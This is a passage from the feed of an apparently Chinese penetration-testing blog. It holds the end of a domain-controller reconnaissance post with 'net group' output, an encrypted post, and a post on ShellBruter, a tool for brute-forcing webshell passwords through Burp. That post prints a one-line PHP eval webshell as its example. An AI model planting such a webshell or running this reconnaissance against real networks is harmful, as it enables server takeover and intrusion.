class="number">86.109</span></span><br></pre></td></tr></table></figure><h4 id="SPN扫描-1"><a href="#SPN扫描-1" class="headerlink" title="SPN扫描"></a>SPN扫描</h4><p>在SPN扫描结果中可以通过如下内容，来进行域控的定位。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CN=DC,OU=Domain Controllers,DC=hack7,DC=loca</span><br></pre></td></tr></table></figure><h4 id="net-group"><a href="#net-group" class="headerlink" title="net group"></a>net group</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\xingzheng&gt;net <span class="built_in">group</span> <span class="string">&quot;domain controllers&quot;</span> /domain</span><br><span class="line">这项请求将在域 hack7.local 的域控制器处理。</span><br><span class="line"></span><br><span class="line">组名     Domain Controllers</span><br><span class="line">注释     域中所有域控制器</span><br><span class="line"></span><br><span class="line">成员</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">DC<span class="variable">$</span></span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><h4 id="端口识别"><a href="#端口识别" class="headerlink" title="端口识别"></a>端口识别</h4><p>扫描内网中同时开放389和53端口的机器。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">端口：<span class="number">389</span></span><br><span class="line">服务：LDAP、ILS</span><br><span class="line">说明：轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口。</span><br><span class="line">端口：<span class="number">53</span></span><br><span class="line">服务：Domain Name Server（DNS）</span><br><span class="line">说明：<span class="number">53</span>端口为DNS(Domain Name Server，域名服务器)服务器所开放，主要用于域名解析，DNS服务在NT系统中使用的最为广泛。通过DNS服务器可以实现域名与IP地址之间的转换，只要记住域名就可以快速访问网站。</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;无论是通过外网打点，还是水坑钓鱼，进入内网后的第一步，也是最重要的一步就是信息收集，而且信息收集往往是一直穿插在整个内网渗透过程中。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="内网渗透" scheme="https://www.se7ensec.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>一星期实战总结（三）</title>
    <link href="https://www.se7ensec.cn/2020/04/25/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%933/"/>
    <id>https://www.se7ensec.cn/2020/04/25/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%933/</id>
    <published>2020-04-25T02:30:24.000Z</published>
    <updated>2020-11-17T15:23:05.431Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="d2f4af0c8329773293154812289138742d95d28b2524285a66f6114be526317b">a5c035cac555b5d84b40189f163d299485d2426daf76f5d717527c9819aab9d53c945bbbf7401f72e2d0405b27521554af47798fa71ad36dc71c69bf94567a19c48cb3acde1fe8628488f25e1c0252bfd3c67f21bae6d3d80289fb2686e5800a1108c5e8da5fd954b38e2ec65cec8c0525e9fda4d21991be3da60f51a005723e10484fc90551275312e0dd1d16525cca1d7045d10bcdc2724695f228aa5690da496bca88b086430dfdaf3c196cb605995602d35ff3ee341925245cf56dbc6fc9267124ae9459e23e42e76d4c809fc6cae6080f3aaefb1196e6f901f23a2c83f986d6b98c39569af6d2fb8d850bd04298c34326bfd2633316c8a8b6b3f808a229f512089e444724c267e524d4fd536693299bd1f8cc1bd33fc105bb164b49516788a867849e74790039ff7e56d91112915792f80ba793efd1c45ffd0e8aa9b8e0c272b11b0f32d6a9d7b282360c12dbc0ff88c80176e0830eee3caa1307d7c70b502072755addab544fc052c6e7880d5284f91251761fe0299fa2a569a74de5e4d28316f532defa0cee31b11e145b6ebce747b85f0cbd2a5c0695d06acd736b75679c87405c332c581903b61aca8e2e4367275ecd52fc7930b49b47fdfa7690e179324c3befcdf5b15c6b2fd8cad61c93195fb692e37c4e25b87ef59133bf3c00ae58be1478a86282d5b4dbaa5e3f95993e8276da4f3f7eccf09d97199f6a5e56469bdc4d36cd801876abf8b50438d8f6051e37edbfade2d45f59954ce2928a73fdba4207abe82ce206dbab3edf36ea06a5b5444afa1a8530b5303eba445583cc362b0e11bf3052e3d71b84a7a7496eb282d2e3c355305119a6529d098095fdcb4fcb4f3de9376e39c5c099dfd6bb67a85ff4a9a0666fd2870c0b9e74ccb948de879ed07f1cb2a4f413f9cbce77857066d716afcc11f7c5a8b040dca3537cdcbb6c92cb20fd0661db5b840587bff3fce805f8aa0611bcc3a10d575babd8985e454546eed45e3670fa58015140ccb08080f92471196e5ccc50526a6f8a6b742b51046915de605c4eb1f0f157e870a9636002a22e457b5ca371f198918ddd6d24f531591a6b96cdb3e56b6a18b798d78a88fada19e3417a511297eb9371b561591a64d2c8b1417cdd11108f862c8cfeecd3c22929486b9f660e74ab5345fba35fceacdccd4a43ceccf70eea8f46c45c36726440ef95078740eb48b9cb18e72506a8de58e913e9e655298915d9379cbac136eb9941f167eafd4fe8681cd5544e98a8e4fe1bf7c9ae59763e07211012b6e67077b2afee1714a01ceba1421bdfb8a294a9915ae2bac20acaa8a2284f3e3830a04da32095df72ffbc7d10246b7dfbb2a451c862e5021b4f8b7f66c05979974ef58f20c333cab6caa84cf3f70c96f980c7f3b14b0634887d75b1990728f1aa34aba2e3c02398bac81ae208d22bc9af0edec720b640eb2fb46639542e4e9fdaab8e9955cae9e9175043293035e5d510d062f47a4888dc08bcf4a838f2f0db159f20f4012aaa282afb04d95a62085f77067085ec68ba029e9dcf612232f4d03f1996683da8b95e75f57d1b15420537a2d23af9fe17da096b675b890804c20cb5d1c4af97af6a7db414f063359802b984b67dcf6db8fc0f84df108d33debf6fe2ab5a79ce00182f6744159ee6a722683c2c213dc928a77621a476970b70bc26142c1d6d37ebf3a7d795cf37e0a1bf8ec316af731b6252344c1e0272c1ec47ace776ad79d23749439f88ac564fe4a8cf1707504f10fb1a6d320e5e3c7c79edb8e646c56153754a4da2fe31f0f102f85a9d994b67317e71f670689cb617136fcf531b5f424fac2fa36b93ebd8a5a450301595e28859a2dcfcb5b5d425521ce5718027679e89f77f341e7de22f70836a8ab7e4e838f8b133021cc1d6949b510fe02a1eeb8a77974cd376939b00dca9c0bdd7ca08f1f20a756d01f4a8efb28e85ad2b0ab64cf0bec99d4130a4fba469efa64788d835557b0377dfe270e6a9f50343df7720247c3f406fb8c976577bb36fd927bb800aeeae1cac311cb39951513072cc9ef038774e2e39396ff7f6a75444c43c26803822e40f1a3db51b936401919d35ba4f938af20a0482441df6d8879e99a6eb8d611f59bc6759b41e2dbe4a902f21f256f17a3e88fb1ed529e305d736d8fbd589ce7fcbb31ed75a3ce3a48c3f97a647d05c3280dc0a7a1bff990f75ab6858279243c2f5b2d1704fc8d613a4184a6d87fe4eef780455a1c3b6e6430a64831f0aba95005a3fade29553a51f30b51086051a270708b3f3b31d3d39df54ccb919a4e8fb1cba87ca112b547d5ab010064ef3fef61d606fab6ddf553e1498766a97b86807a953fcaf1e602f7abaafb6e6942d45b111835195c6ab32626ab83ba42258fd3defe1462cd6096a203ad608af8351a89d6b62cedd195923852662102b32051f39aaa7ef2aec438902b90bf58bf10c8e8bfc5f55d25183c29bf520b6bf9b5df1c6a5fa43a00d433b1f41a713f408df8b7192a8a5761f15ea7ac73237692999a86d4f23a77b14e150f47b4ebbb05bf3dc3c1f979003016c5b7bf98e9d753a7da75d71da4c5e618a6a4f9c4ae9040a75a1befa81fb211b9937528f1db06edeb7924a53cb762433b4190aeb5f6d180e194a687a8821779c92794224e3f4de62adce13a5edd61bee537a153cd122031cd0a513648f355e0d7344ab5c4f31da35851682e060fadc1e755457076b24ef72ce5d7a36bedb58554a01f25f6004bc015375c4fa6098fb8c59e313f860cfd040a990d7174f60c0ba5e6c374c4d6ea0f8fad7d4510f750abf19c80400c9ef36b45225c19afa6c2bae928d2df31f03569101939884f453d96eeed70ff455f381b615e27948f0b5156699b6c5fb55372432c5cc0063ab5a07877c177c99ee5c9c4b24c06db20a59467c59f828deb144a5662da89d34f263458870d1b5b0b5c0672612b8a12e6d49ed9e8f119e7d80e39114655166be443981e65e3bc341a3adb10d92849d6af5a12f2fd6e22b4540ffd3afffc8d60ca45dd2d973d1f9719c124bfe66a274fc7f65852717023026ba41c7af56df694b3c4e51c758c3e52fd41e6430f009d29dd12c9ec39d3653e701a8bda46f19e05036c00842fb1a290d2f2205867cff1613a6507144fd60324d6a50ac42285c32e6393309a951343030bb2b4ffe1d1a96c1534a0ef761a0790b72f81b845d79c229cd8fbec4df2cc39294ff14591c293facc50fd40d627c7f4e603540b2c4cc1ee6a7c14ea4953d20e2de6b308606da1b9436452097a0c85afd3ce062d8cfcb61acfa41f157ad178c8b078ebf3a4fa1c08c34a101b23bfd01fef6419593eaa69cc14349085634143c0b82773ecee79232c6ca0bee22a5b7f9e195d903084febd63aed78545ba1abb7cc3d226728678e81e47ba01164f8f1df9169ac28ad6c5adf9d91f72fe7382c7ea3379cbda818c25b0ebd0d35a806e7371cc086e49868f630d5c990e53ce0ef192113404acae2668487eb4501f6d2fdbe2f622617fb5de965b20610d9b0e8f51314f83981636b3279795b84e0cdd45f7111b14cbc69be00bdbc270b942fe1159cf0913ef462fdbcc7464c698a9780d2da90bb769426884f18f4f26789b3327ab64ecc44f9ecdc4ec714e33fe666794bd113ca502f721a455e8b3614df8c8d66e00657dedd9354b762d140a0517914cec794b9c668eb9f5fe57c7b030bc91b39ec3bc86e7d161e8742e16d56f6ba05b186a40e0c5e8fb531ddd3de2404400ed64954ad47b7c4490ab4dfb619dffb6bff2302cad8e5f745a34b80b2d97bb16f87bf63693e63792e1f9207caf57b2818d5d17ddb5e6ba1fd662f555e2e77193936e0505d2a625fd1fa329ceedf094ea6a6b53bc5a621f643550594991ec895ea6554322ac5f9390d8f936f967987e0f2e109921bdd39ca70600e528b7f0346e5bcd8488133744df24d09eea94fa4788b8e16d65ed830c696e5e0487546cbf4f0d106e00e37b3bb1994060ac8dcf300cf10fc4fdbab1c017f4140e54c0dc1bef3a6c3d21fd2de7921be3c917528ee365eded7f85b61d71cabf809e2c4327192673ff55203a9a4d358abe8af7f470e95a9c5bc720a9785bd2ed90159d6080b3c2df90a19a1c62cc874e73712fe09870bac9f044b952b96cd49f3a4942906552ec7e1c933b91f607623ca7f6c2f6b7eb3aed06976ddc790a181cfe52bdfa9330f1c3eeefae15cf287124b0c731b5125c4c65f4542336fa901a948260e66f232950f196eb5a24176894aaa24e70bf4cfa601fb40a4672b46ec2a5fac18ce91b163255e751dd777924d7aafa3d3e2474a566acc26cd91df6febcdccaf4f1daab3c6744f0b2fae34c27fd744a6a60f021516ba5935c0d888707803b603abdc0a6b220472602e1d3f2022c17e93a17f3add71d6dc626b216037bb705860b994365e15be44ac60f24b78060bcb91246585c2b7894eb74d90d90cbcbfc0c6dea0472b8b741bc55062408e58ff796e9f0cca947119632ba16cd28cebb35f41de2f374e568c8070e4cd8746c8b65aa2a70e8d067954f559cc3cd0c3621bfa956a2fd93397ea4b660bb874dcf4e7650dd2de326999205bb5a4cf29f0d9a8c722947b9b206b389d570aa9a4842d60da4542ca0e28eb380061c2ce01962adcddd5fa73836990ffbeaf2a4487c9e03567c42e4ecfa45cebba0898ebbeb079b74d249a97865b57c5dfb9432f89cd00a93e0349a4ba0e32febe4d56687d5330c6ea7c6faee6f1184a66c977416ec959de517ea2287c1be2d55640011cbe6884ec965a9a100392653739a885c1a10ba1f9d3f487ad956a9762d550c6b26cb664f017fbe9d7807151952e6df25717f05d10f798ef4cd4515e522c1a9aa83864a1ba2c60726df0300e5745d87a076d34cddd06a1da0d72b88160d8f15552b251ec0c114d18c4f63a95df78f8a6faebe213b052dc4496b4c369c84d066bb71a6366cbc9f337a6097fa81b5fff2b7cc76c00e2a5579403acae102f0a86ddbcdcff9014a6a81150a23b675d6beda0308cbcfa5e273bf6fac4b7e41a59522265b62e3ebe569ca0c4e1c16b0578ad0a7318d4b616481151a4ffdb3e3d36aa0afba69d4ba33d9c919660f71e03d4d672640a2fdc6ccd6dd809d52b8491556c3ca787683f4cd7530ccb0b8eb69693c2f060f9994b2e76ce49dc207c8b7c7eca5159cbe6e62b5f077d1995ce0d8d076b7435a9fdd6e8c41f633b4305287b8a3091ef1e12d05040ce100f8cf6568102cb3ffea4b43f9c287f12b3ccd443a28926829ea7dc2f9dcf12b0c0524ccc7d8b02250cc85f9f4c94390df38bfebe0536717f022e1c6ce9b1b910dc985fefac85271d489c09d74fe543903d96fb3554bb66e46ff988fb5c21d756d3d2417b9a8761f8a1a62701be25d5e375c7fa4b6fefe340a2e3d4ba11dfc76d5315f4e83b3f8dfa1ef57c9c968363564cffc5f5b7e608febcc4871b124db61ad9ce2bdfa9ee8238428fdfb35567bad279c6d73f19dfd085bf9e9b69f6ff74e31729604b3f02570c4bada5fcfba999e650277d2ff3c5b6a05661a132c9961153d96ad2a5fa6fa45f023cd5151b52704d2d4bbf89d5714df88f8c89c5bab7821121f5310db4a634ebf05e0fb19f0d25678dc94162b25d6b1fd9bd391b203645f1dc1855855c09da8f37a1a7513f74f9cbe0306507a635fde7e8d08aae4765dde55940cec3bf93e55b251c696bc2de3fb47b27404355d687db09742030a64d56ae2a54602bd0ceb0493c711f90c1b6cde4800d35adc4cabb690fa72704a46bc4d46df08f67781b28cf0323ac44668d3a27d6c36f92798dd91fe3581c196c42c7d2e020a698fe2e0b5e9426347145123ecd7f9782df01efaabd8d78a97bb95f9afb5bbf6c47a2b6c3ddaeb3cd7200735fee6c1e0274d3e78b25d0184331279a27cbe73fcdf56dc92fd75cbe02663d4d614e53e275c4348e2d66e126518994d879898e29f4dc35e211792c5027560c0439df00f0982b95edcc0e87fae095a70782e162e5f023de6ced150b22bed803c9dd6adee0b9d0c68d3f8ea416b5c75b7ac63c6fe5a30572d048bf24ec8039f7cc2ea2e9803d3e5d8fee25e30d02705a66dff7216436b7bbdc815b77da90093b5b362bde5ee75a9d94b697e5ff9448d29f3986163a702e1cf6ac49e36f3fadc82092edc1b7ac0f665dd2bca67800a48317000ae1207af3e5f51c1f802b8f20e426bf78c5d2446f4ab53b3badeb5d63073a75c4018eefac21ca8b32bdcca78d2e3c82951f98cc12f75e76ae31a092869678d18e73008429e247abb15db72c51b5e3a130ae343a0ca58fc9c4b37d7aa90b9102b444c697ea630921171f0255c58b2e6617d98515ce0579f23231626a322d35fe20fce0dbba0c02b21d082a7adbd062300f6bef326badcb6de506689a787987f87c7db094f66fb176cdc543eb0a2a026933e72a481f442e5cbe47375006f226e4043704e08ab8f29d2724f3c8456ecc7912d92185ee8a6ebda4fa595ce3a1e2a94a64f5065e9096a29d7cceda91087d6ecc902e295dddaa1679ea6ed3be31c604092fdbbe04a14b7d9793930a5b994018aa84e202a29de4020b2d2508fb4295a262d9dd2174ed5b95c6a680c2efeac26ab4c13bef5d4db9cbd17297ac2e6077e4aa7d135acd0e58f70ec797b3872ce572e9a1d36906f3248b6ae531760598f182bbc27e3b79bead9f02e62cd8639138e59fb58c6602ed5eaed7b9f68fc5daf441ac211db226b525da665f5f0833d66d9fc95c245b1163b6632a3c25dd640dbe503e579ff877f4d543b9a88144dfe96397cb4a4aa5414e3a5c982dff19093e7bb0c82a42d49edc68d460b0c09e807611c58a4e2c5e20a38e55411a8b05ade8bead7b7650349a4bd6afcbd6351c11124f3e646a192e6c6eb3b3141c771c847dfcef6919abf3ec8247ba5c00994d11aa63920edfe5f32d9738c15198db91358dd331d46dfb35161f6a29a9449a3a29c683c50dc2da78ca2450cdf2f3dfc8b256ff44dfbfff96391f8a2fee5ed3965c0801858619bf10d7229b2c03f320c1ec105d6e9a8bae5a4db3cba32f72d29ee58812ed139a01d4a9f7de4a4a976509b61c0d799514dad2bddd03a9585cc192243db14955cb9e361cd48e9d114d1cf53e48db7ec642cc61d58028ca3d9edccc13fcbcc022273c50c2319d50e19ec49ccac217e33ee28e01e46e1ef14cbd06221c27b742d416634b2d1111c46c1da9c5ef1a00fdd0c5cadb7b2101b990d2ff9a1641d7662b81e12f8bc105466456e24a823cfa1fdab13b34e42b8c053945bd186b1b646f4458e62cb4d8f4c5c511ff9f83c6b81f2cca79a11a904e68c3fdc3eee3eab74d6db8faf0ec81660f9ff3b3b1e33e83e7dd1768ab1de678f64b57d0ac0890938c1156a4d2bca27be7821b2e3aa39749d6e84a627c07c15878c39e23ee30455ad26f862efe931d23f13042373451e364d13dfb0b3182747b33691118236c4a8cfb8e12e7272fbd92234b80a9169cc1ac936194322cf3c75f20b14193b391653f8859c755d24239f116e9397dce1a76e2101d28eeb02a31ad28f19b8006cae78e0543f444bbb7476813f7f2bf1d8c1c5fc481ea11210efdd92550601730d961cf0633844ffcbf8df9a3ef11539bf04245cae41ef706d03ee0d0987d7063b31d37489431e4fe7112ac5802977386c064155e8099611296c976f01048302ba328344fdfe9301fd9cc6d73be7e44ee2f9d956c33ea642a7d6597531bbb355ad4d2315b5fa28e7c75c08a8e75b3f3ca09d10863eb90ab7aae538d7fd1f27e99c50dbd2c14a264f8a07b3898d5d4f640041815ad14a14b9ef87f105696996424b4c5f4434d6d1472a9ffb3c02b1154424a6aca1252d930b99392bde2a78667e5cf19cc1c2feab6ff3067d5fa5128b45c81b6362674bbb1117a4f275d99c5b2346323c2523097b5211d95a6582449affde375316e742e2c9593c62f71238e5331493aa4446bb6154b304a07e20e00f208486979a0933fda4735cc0216fe92b61d22b515b6881d3fde32eccac5dfe20cbe4f5d27cc6d1cf5a2bf722c2941951a8d0f6a720777c31065ee2cd3d74d96675628aa692b0e6bcf3be39c4f530e398c1eac301dc4b1f73d92f2de57a57580e91a84255e0c9f8241311520c98921568bcb794f524d3657b3638cb4cf92368afa2ed898a684bd406cca3e70b390ad2350603d54c495dba8a3de611d9728bafaeca1b54488c3e61c9149cf98002b9acd87f64215db5e1c0353248598f9ee4eaf101389a614b0a9b639b036380afe02cb00e42a3fc5cd26bf62c0708cb9c349654d8145f9fe7ab91e00424fcd805edec5fb8cae323df8160559cc2e89597504e1f5b997350d227f89f27dffd932bff7f6e55cf9571b8389b7865a55d5874a53f12ad1b2349855578be5207dfb21219696c5df6e644a3b22e7f6377e513e503201c671ffac61a707ae2efa382c5026ddb9cb2245597a369f085d11a1e52b1cb8239dc650eaf78abf99fd7b783a1f06eccd608e0bbebada58266e389bbb3f6b3f91598bafda5b3a9a53cfdecd59995f7fa7aa577141b2447fe93567393f94cd184ec1afcd58343555dc1eae1007f3a1a4703050b8989ff9ed1569e28299c2309e0ad0c1b5bf2af1acacbe9fe2ffd8e98b453a5122ac5b89e213d97616aae47ca8493f1f9275cab4099f5dde66b80d3f64612527a3ef4a593154216ff8c59b5b63330c67da324246ebb1f4939725f32de7969f2619989e40b9c9cf71421d3cd74fc824af3fa5f2f7afe63dbc58be8aa705bbe9adc098866fbcd1003c12d81eb7e8e110d790d2801dcf67357b9ee5d8df7770545d1e0622fb22fb258246391fb83b406789a9650306486eff87ba8c82cb0630b4d522916d222c5b9fc90003dde834b9a8016d4c8ee98ba9a0588ce5a48b48e6f0ae8b878c766e4f2833da479a3e558dac86fb2a5c1b2ba29a66df22b84741682b35a045e33d07f079dbb00ef787763a22504b4d1858f32c7c0d1c6c0ff93a09bd4fe720b8d772f8799ae31d8662feacd6eaa004240bd1626013db58f68c6f465b6b62f1625347158a5bd03df1c2e7eb6280c2a65320619845c28a668d15e351000a46eec1ceb1f111e9a4d4e8bb1602ea66b39a393eb738179e1fede51fe8f938deccfe9c07ffed83103c184bd0d348fb94b62520fc32790264b6b851d00ceac84a74b0bed686d78c2066cadf50a68f9810946d3ab909873715a7d586f1b4a3d3bc5d6bcfba410914a41631b25b37e1e74199bfc1363d2de2fafdca6c9d3a6ce0154e21284d365a228a367743f218b39de8d8f505ac5f540e40e06c9de1ad1a8e978946354aea2dba56a87d0dad386eb525a54fbf26e1790a4acb055e309f3371ce710bcf1e767dca6787069bb884d04f79c585f9fbae85435c338a618137afeed157f218961d9fc986db95a01b20dce939285680dc83af1b668db3b59155f6cb0bcfef988cc1179dca6c715a92c84b51e6e7bc11232cc3d5b7c91e0a6ab54bddda0a80e02ee3663ee95a0533f5d8997d7ce908bbd8a619cf5a0cb0920029cdbb8acafce8bb255e21b608a9ea2cc2d649300218ab0fa5e9824cae31df234254bced9470ae07d6deb07e90695ad252ca4409a773af421b89c61c66958dafb64bdb8369cd60e90d0b69a4a4786357f473e10a513b8916253541cdd86edc7ff3d50fb9b68691265f1cb3953aa81524cdbc25595f39c14df91deebd1ea0ccc3f5eb56dfd69fef9244117bfae11a394ca4ed332ac9bc66a0c4c9fcc89c34b9e48068abbbe9297d6231f737273ff2eab16bbcbc41bba1d2ae4deb31c637f2093d326ec1a8dd33dd9d254b1d59dac12e7c2dff6a72d2afbcc2350539d52b236b25538961bc40ef6a439afb7863320ef7203856fcfac5007d5c382d581292e5f9f4be3b5723b2f3fa60ff58fe8ef1e8ad1f8512575c4dc09191361d20d9bad05227b1da56e8f3f68cdc003ee72068accefd856efb20e7ee3fd9fcd2515de76c7c1739fd6021ff3f102470ff474861b4cca644ab1f9a168b8be85c0ce50cf217e2b3e7f2bd0e09ed1cc9010f4eac335939e7b81f3598f84976deeedb7fdbef443a7b3625ded7288ae0b593463592ba0b4f0af0b19e8fb2e196b370ad53b3ddc3c0da5b0b440f6df308888a5e9d1d309dd5826e9c8255f42c7399ceadfb1c52a8d08e43917c9d35b93ad6ba711dc95ff4d5d11b32d968acccc91c5b8b12e3e298e1f1355b10a7418f58527abae2ca2f8918ba9681ac5d177f998d4335e3884ae808821c35c22c8b0e40b44614c88c6139a05b05c71788880da36fd3e08cf5498107eecb3127289c0c9cc15a7d30141269ca116a8b86ebdaada42d4541d5d19fe497c2051c2db20f634c89d2db538eb506a940a3f2da7760e8b42bc5bad580caf8c22f02264b74444b0ec810ea5ec2ac4c3e202cbde0f70d3925acf0d31c8a4c435bd94886930679ffa94aa147892ede6d1dd42794997b8e1f3d1fd3031d6673ba9602877fd97e0b9a2e29dc8f69868a85990198122bf9eb5b4065480651d64d3fd3b8b758c3c45b87304276a804439c8fe5ae58fa101be2475a94f2b8306da4c6404225219667bf87379b8e483b0f96695a5db474c876627a80f5bee8f902f37cbb8fd3ff07da965f38d02542a7ef3f457ec728975c4f1a3a9601434607b148de379df3ab28177004939c511baf219fee70fade6c5822e569edc474157273aabf5300e02d8c3730bee0dda402f512c174804f11fb79873792473dccb4f307c2d0992c42f16fe4d3d853d5a4313c3b483e919fe592c29539821dbc5b45046441856920cd410572baf8f9b44b398cea729d6eef7b6c6a6e1a8d2c3a6d26c7bd529ce4a598b13c7e1bc3068fcab3fa85d101bded09654561cfd4b8fd2d343e05233a85b28e663f7c45ef2f7884aecbf8010a90098df810023e3173b014f5e2953de2d519512f8d58f22118805c68a850e5cf0b9b865783821bbcca298a7d70b9c84841aa7c15f5dc81dc3a236af077a7563a550eaf8234a453e472cd7f3ae463cfdb5b45a8874d0efadfd232858c126914b0b381fa03601fe5579dabd80b43091fdad2ff707b353993229a1eee9c8c4602020d0bf7ca69d6d8c0e2550d5309cb9d3acfe693cf3b72795f5c5855d5cce4334ffe98044fdae27ec6502160c1404c1142fe4ada3b8dee02fafc837fcdf62d67f7c0f8a24ca96a91312c713f4860540ba12e02de34282ee56ca0dfebd3fe8e2142f229d4dcfe6ab99fdf8724ecec65484750c9eaa7e7a10cb65497e715643811aa2ab7d63334c67a5277889bdcd1ee93ff85c8f1a3388c7f93b599f68dd4ce96f4d6f3c9880b63fb05e050c191c120ad313584e78d119f20a3fe94355413fdd1f03c5655803639b9b2d894f50d5e817d6d26aca4055b8ab4b0de28aec92c5e164b06da998296e53659b85df0fce096c505397056dd28fb6f041633c8c2eefcbc76cab3a6305004c96ed30e8d637d6e2f4fe1046f64f7faad8ccbaa3516b81d2c3eb5611ca123756dd4f0a3a5e9b996ee0491d973ce2a416577a2fd1d51612e7d3d99bb3d5a25921b602584c08b7d08072c1b363b2f2ae452911b19472e89a19343350c4d2c3d04bbc3774458c971d729842a95c8656e569293e0f1ca9b11239032906d6bc1d1718b26cc7e5d174560e752f87de4c3fdc50acde0c757f42b570b27082fdec119e4a71c63dfed56d7f7971729f4d0a7150d6232bea1929f99cae2a8d177f2fb114c3b7259385293cd5ee819ecf3eb1c852a16e9ed739946ed930d41c105073d5505b9ce866b15ef44da588fdbcc77dbfd95474e6b388f1e7161779161e81c6bc1b3d6daa9001ce46d4667d0db6acc0abb4eb729cc39bc0d00b5503d4f4437f1cd3a3d0dcaa84d577a48de2e4d6640e2618aa9c090e990f52255f014c7c00e70b20856c424d95d4af4d8e8ee7f71c55624f113322953b1d9e50fe704e379ea8575ee32d125eb05671908d31500cbed4a2f3f6442990f7a32b87d3900644dda449467f1c16062ed32a2c6c7c8c0785e9c7023024d643a01be25183b325a54d09e2a36e8bb7f0b4933aa35384c5c9abe1af81e099ed015458901d92122c9ccf57ab2373311fdc4d60308cb6a5a4e90449d328b1b3ab40d009deea38c6d036efd60a0bff5bdc4b550fcb553f02ccbdc665683fc54e03d423eca8b7858fbe4324bfec5feb28b23cf7338192cc80c1bc733e0122dbade6f52a36ef42bc8bdb738b0057562ca24f50651de0598a4084a2595b65d82d302930ae7e1106925cde28fc2c5e51f944b760f2b842d188f7fbee4129196500205775ae30b50702c16c0e50e49ccaab61a6961778901d84c4fbcc6a97050613b707bf35364eae2c3576c4c627b5ca08d03ecce4e13a74cfbd101de2a9e72c94b39e8</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="一星期实战总结" scheme="https://www.se7ensec.cn/tags/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>ShellBruter|WebShell高效爆破字典生成</title>
    <link href="https://www.se7ensec.cn/2020/03/22/ShellBruter/"/>
    <id>https://www.se7ensec.cn/2020/03/22/ShellBruter/</id>
    <published>2020-03-22T13:30:24.000Z</published>
    <updated>2020-11-14T19:59:43.480Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>江湖人称轮子妈。</p></blockquote><a id="more"></a><p>爆破思路参考：</p><p><a href="https://www.t00ls.net/thread-36985-1-1.html">https://www.t00ls.net/thread-36985-1-1.html</a> </p><p>这里不继续用python写请求的原因是感觉让burp处理这些会更好（懒）</p><p>使用示例：</p><p>假设当前shell为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[a]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>1）burp加载生成的爆破字典</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.03.23/1.png"></p><p>2）关闭URL编码（很重要）</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.03.23/2.png"></p><p>3）得到结果</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.03.23/3.png"></p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.03.23/4.png"></p><p>此方法可灵活使用，其余可自由发挥。</p><p>github地址：</p><p><a href="https://github.com/r00tSe7en/ShellBruter">https://github.com/r00tSe7en/ShellBruter</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;江湖人称轮子妈。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="暴力破解" scheme="https://www.se7ensec.cn/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    
    <category term="Python" scheme="https://www.se7ensec.cn/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>一星期实战总结（二）</title>
    <link href="https://www.se7ensec.cn/2020/02/24/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%932/"/>
    <id>https://www.se7ensec.cn/2020/02/24/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%932/</id>
    <published>2020-02-24T14:30:24.000Z</published>
    <updated>2020-11-17T15:22:56.679Z</updated>
    
